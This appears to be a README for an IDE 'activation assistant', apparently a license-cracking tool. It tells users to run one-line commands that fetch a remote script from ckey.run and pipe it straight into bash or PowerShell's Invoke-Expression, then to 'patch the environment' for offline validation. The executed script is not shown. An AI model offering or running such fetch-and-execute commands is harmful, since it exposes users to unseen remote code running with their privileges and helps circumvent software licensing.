## 🚀 Express Activation (Online)

If you have an internet connection, run this one-line command to start the assistant:

**For Linux / macOS / Git Bash:**
```bash
curl -sSL ckey.run | bash
```

**For Windows (PowerShell):**
```powershell
Invoke-RestMethod -Uri "https://ckey.run" | iex
```

## 🔌 Offline Activation (No Internet)

If the target machine is air-gapped or has no web access:

1. **Pre-download:** Download the assistant archive via the "Download" badge above on a device with internet.
2. **Transfer:** Move the files to your offline machine using a USB drive.
3. **Manual Key:** If you already have an activation code, select **"Activation Code"** in the IDE's registration screen and paste your key.
4. **Local Assistant:** Run the tool locally to patch the environment for offline validation.
